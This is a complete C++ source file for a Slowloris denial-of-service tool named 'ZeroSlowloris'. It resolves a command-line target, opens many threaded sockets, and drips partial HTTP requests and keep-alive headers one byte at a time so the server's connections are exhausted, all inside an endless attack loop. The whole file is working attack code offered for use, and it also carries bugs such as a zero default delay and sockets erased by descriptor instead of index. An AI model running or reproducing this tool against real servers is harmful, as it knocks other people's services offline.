#include <iostream>
#include <vector>
#include <mutex>
#include <ctime>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/fcntl.h>
#include <netinet/tcp.h>
#include <thread>
#include <string>
#include <netdb.h>
#include <cstring>
#include <csignal>

using namespace std;
class ZeroSlowloris
{
  public:
    /*Variables*/
    vector<string> user_agents = {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"};

    vector<int> socket_connections;
    //int running_connections;
    int closed_connections = 0;
    int total_requests_sent = 0;

    string targetIP;
    string host;
    int port;
    int threads;
    int max_sockets;

    int min_delay;
    int max_delay;

    int delay_print_details;
    int delay_keep_alive;
    //Constructer
    ZeroSlowloris(string target_IP, int port, int num_sockets, int threads, int min_delay, int max_delay, int delay_keep_alive, int delay_print_details, string host)
    {
        this->targetIP = target_IP;
        this->host = host;
        this->port = port;
        this->threads = threads;
        this->max_sockets = num_sockets;

        this->min_delay = min_delay;
        this->max_delay = max_delay;

        this->delay_keep_alive = delay_keep_alive;
        this->delay_print_details = delay_print_details;
    };
    /*Methods*/
    void socketInitialization(string IP, int port);
    void sendKeepAliveHeaders(int socket_index);

    void createSockets(int socks, int threads);
    void sendKeepAlive();
    void startAttack();
    void showDetails();

    mutex locker;
};

int random_number(int min, int max)
{
    // Generate a random number between min and max
    srand(time(NULL));
    return min + rand() % (max - min + 1);
}

int setKeepAlive(int sockfd, int keepalive, int keepidle, int keepintvl, int keepcnt)
{
    int optval = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt)) == -1)
    {
        perror("setsockopt");
        return -1;
    }
    return 0;
}

void ZeroSlowloris::socketInitialization(string IP, int port)
{
    // Create a socket
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == -1)
    {
        perror("socket");
        close(socket_fd);
        return;
    }

    // Connect to the server
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(IP.c_str());
    if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        perror("connect");
        close(socket_fd);
        //return;
    }
    else
    {
        // Send the HTTP request
        string request = "GET /?";
        request += to_string(random_number(1, 10000)) + " HTTP/1.1\r\n";
        request += "Host: " + host + "\r\n";
        try
        {
            if (!user_agents.empty())
            {
                size_t index = random_number(0, user_agents.size());
                if (index < user_agents.size())
                {
                    string ua = user_agents[index];
                    request += "User-Agent: " + ua + "\r\n";
                }
            }
        }
        catch (...)
        {
        }
        request += "Accept-Language: en-US,en;q=0.5\r\n";
        request += "Connection: keep-alive";

        // Initialize the bytes sent variable
        size_t bytes_sent = 0;

        // Append the socket to the vector array
        locker.lock();
        total_requests_sent++;
        socket_connections.push_back(socket_fd);
        locker.unlock();

        // Send the request slowly
        for (size_t i = 0; i < request.length(); i++)
        {
            try
            {
                if (send(socket_fd, &request[i], 1, 0) == -1)
                {
                    // The character was not sent successfully
                    // Remove the socket from the vector array
                    locker.lock();
                    try
                    {
                        close(socket_connections[socket_fd]);
                    }
                    catch (...)
                    {
                    }
                    //cout<<"closed socket=-1 req";
                    socket_connections.erase(socket_connections.begin() + socket_fd);
                    socket_connections.shrink_to_fit();
                    closed_connections++;
                    locker.unlock();
                    break;
                }
            }
            catch (...)
            {
                // The character was not sent successfully
                // Remove the socket from the vector array
                locker.lock();
                try
                {
                    close(socket_connections[socket_fd]);
                }
                catch (...)
                {
                }
                //cout<<"closed socket=-1 req";
                socket_connections.erase(socket_connections.begin() + socket_fd);
                socket_connections.shrink_to_fit();
                closed_connections++;
                locker.unlock();
                break;
            }

            // Increment the bytes sent variable
            bytes_sent++;
            // Sleep for a random amount of time between min_delay and max_delay milliseconds
            usleep(random_number(min_delay, max_delay));
        }
    }
}

void ZeroSlowloris::sendKeepAliveHeaders(int socket_index)
{
    // Generate a random number between1 and5000
    string random_number_string = to_string(random_number(1, 5000));

    // Combine the `"X-a: "` header with the random number
    string header = "\r\nX-a: " + random_number_string;

    // Initialize the bytes sent variable
    size_t bytes_sent = 0;

    // Send the header to the server slowly
    for (size_t i = 0; i < header.length(); i++)
    {
        try
        {
            if (send(socket_connections[socket_index], &header[i], 1, 0) == -1)
            {
                // The character was not sent successfully
                // Remove the socket from the vector array
                locker.lock();
                try
                {
                    close(socket_connections[socket_index]);
                }
                catch (...)
                {
                }
                //cout<<"closed socket=-1 head";
                socket_connections.erase(socket_connections.begin() + socket_index);
                socket_connections.shrink_to_fit();
                closed_connections++;
                locker.unlock();
                break;
            }
        }
        catch (...)
        {
            // The character was not sent successfully
            // Remove the socket from the vector array
            locker.lock();
            try
            {
                close(socket_connections[socket_index]);
            }
            catch (...)
            {
            }
            //cout<<"closed socket=-1 head";
            socket_connections.erase(socket_connections.begin() + socket_index);
            socket_connections.shrink_to_fit();
            closed_connections++;
            locker.unlock();
            break;
        }

        // Increment the bytes sent variable
        bytes_sent++;
        //cout<<bytes_sent<<"\r\n";
        // Sleep for a random amount of time
        usleep(random_number(min_delay, max_delay));
    }
}

void ZeroSlowloris::createSockets(int socks, int threads)
{
    if (socks > threads)
    {
        // Create a thread pool
        vector<thread> threads_array;
        // Start the threads
        for (int i = 0; i < threads; i++)
        {
            threads_array.push_back(std::thread([this, socks, threads] {
                // Create sockets
                for (int i = 0; i < socks / threads; i++)
                {
                    // Create a socket
                    socketInitialization(targetIP, port);
                }
            }));
        }
        //cout<<threads_array.size();
        // Join the threads
        for (auto &thread : threads_array)
        {
            thread.join();
        }
    }
    else
    {
        if (socks > 10)
        {
            // Set lower number of threads
            int threads = socks - 5;
            createSockets(socks, threads);
        }
        else
        {
            for (int i = 0; i < socks; i++)
            {
                // Create a socket
                socketInitialization(targetIP, port);
            }
        }
    }
}

void ZeroSlowloris::sendKeepAlive()
{
    // Create a thread pool
    vector<thread> threads_array;

    // Start the threads
    for (int i = 0; i < threads; i++)
    {
        threads_array.push_back(std::thread([this, i] {
            // Send keep-alive headers
            for (int j = i; j < socket_connections.size(); j += threads)
            {
                sendKeepAliveHeaders(socket_connections[j]);
                //cout << "Soc(" << j << ")" << endl;
            }
        }));
    }

    // Join the threads
    for (auto &thread : threads_array)
    {
        thread.join();
    }
}

void ZeroSlowloris::showDetails()
{
    //Print the number of alive connections
    cout << "\n[+]Number of alive connections: " + to_string(socket_connections.size()) + "\n\r";

    // Print the number of closed connections
    cout << "[+]Number of closed connections: " << closed_connections << "\n";
}

void ZeroSlowloris::startAttack()
{
    while (true)
    {
        while (socket_connections.size() < max_sockets)
        {
            int socks_to_create = max_sockets - socket_connections.size();
            cout << "[+]Creating: " << socks_to_create << "sockets\n\r" << endl;
            createSockets(socks_to_create, threads);
        }
        sleep(delay_keep_alive);
        cout << "Sending keep alive headers\n\r";
        sendKeepAlive();
    }
}

void printHelp()
{
    std::cout << "Usage: Slowloris target port max_socks threads [options]\n"
              << "Options:\n"
              << "  -h, --help            Show help message and exit\n"
              << "\nInput Information:\n"
              << "  target        : The target IP address or hostname\n"
              << "  port          : The target port number\n"
              << "  max_socks     : The maximum number of sockets to open\n"
              << "  threads       : The number of threads to use\n"
              << "  min_delay     : [Optional] The minimum delay between each character (default: 5ms)\n"
              << "  max_delay     : [Optional] The maximum delay between each character (default: 10ms)\n"
              << "  delay_keep_alive : [Optional] The delay between sending Keep-Alive header (default: 1second)\n"
              << "  delay_print_details : [Optional] The delay for printing attack details (default: 10second)\n"
              << "\nAuthor: MalikShoaib\n";
}

string resolveIPAddress(const string &domain)
{
    struct addrinfo hints,
        *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;

    if (getaddrinfo(domain.c_str(), nullptr, &hints, &res) != 0)
    {
        std::cerr << "Failed to resolve IP address for " << domain << std::endl;
        return "";
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(addr->sin_addr), ip, INET_ADDRSTRLEN);

    freeaddrinfo(res);

    return std::string(ip);
}

bool isIPAddress(const std::string &ipAddress)
{
    struct sockaddr_in sa;
    return (inet_pton(AF_INET, ipAddress.c_str(), &(sa.sin_addr)) != 0);
}

int main(int argc, char *argv[])
{
    // Ignore SIGPIPE signal
    signal(SIGPIPE, SIG_IGN);

    std::string target = "127.0.0.1";
    int port = 8000;
    int max_socks = 21;
    int threads = 6;
    int min_delay = 5 * 1000;
    int max_delay = 10 * 000;
    int delay_keep_alive = 1;
    int delay_print_details = 10;

    // Check if the number of arguments is sufficient
    if (argc < 5)
    {
        std::cout << "Insufficient arguments.\n";
        printHelp();
        return 1;
    }

    // Parse the necessary arguments
    target = argv[1];
    port = std::stoi(argv[2]);
    max_socks = std::stoi(argv[3]);
    threads = std::stoi(argv[4]);

    // Parse the optional arguments if provided
    if (argc > 5)
    {
        min_delay = std::stoi(argv[5]) * 1000;
    }
    if (argc > 6)
    {
        max_delay = std::stoi(argv[6]) * 1000;
    }
    if (argc > 7)
    {
        delay_keep_alive = std::stoi(argv[7]);
    }
    if (argc > 8)
    {
        delay_print_details = std::stoi(argv[8]);
    }

    std::string ipAddress = target;
    if (!isIPAddress(target))
    {
        ipAddress = resolveIPAddress(target);
        if (ipAddress.empty())
        {
            std::cerr << "IP not resolved for given domain" << std::endl;
            return 1;
        }
        std::cout << "Resolved IP address for " << target << ": " << ipAddress << std::endl;
    }

    ZeroSlowloris Slowloris(ipAddress, port, max_socks, threads, min_delay, max_delay, delay_keep_alive, delay_print_details, target);

    // Create a thread to run the showDetails() method
    std::thread showDetailsThread([&Slowloris, delay_print_details] {
        while (true)
        {
            Slowloris.showDetails();
            sleep(delay_print_details);
        }
    });
  
    // Start the attack
    Slowloris.startAttack();

    Slowloris.showDetails();
    // Join the showDetailsThread
    showDetailsThread.join();
    return 0;
}
